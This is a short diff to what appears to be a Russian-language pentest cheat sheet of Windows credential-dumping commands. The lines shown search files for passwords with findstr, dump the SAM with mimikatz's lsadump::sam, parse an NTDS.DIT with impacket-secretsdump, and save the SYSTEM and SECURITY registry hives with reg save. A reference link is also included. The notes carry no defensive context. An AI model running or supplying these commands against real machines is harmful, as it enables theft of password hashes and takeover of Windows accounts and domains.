@@ -24,10 +24,19 @@ cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config
 
 kiwi_cmd lsadump::sam
 
-Распарсить NTDS.DIT
+-----Распарсить NTDS.DIT
 
+impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text распарсить 
 
-impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL >> text распарсить файл ntds.dit
+----- Получить 10 последних пользователей
+
+Нужен system и security
+
+reg save hklm\system c:\system 
+
+reg save hklm\security c:\security
+
+Подробнее: https://www.securitylab.ru/analytics/517178.php
 
 
 
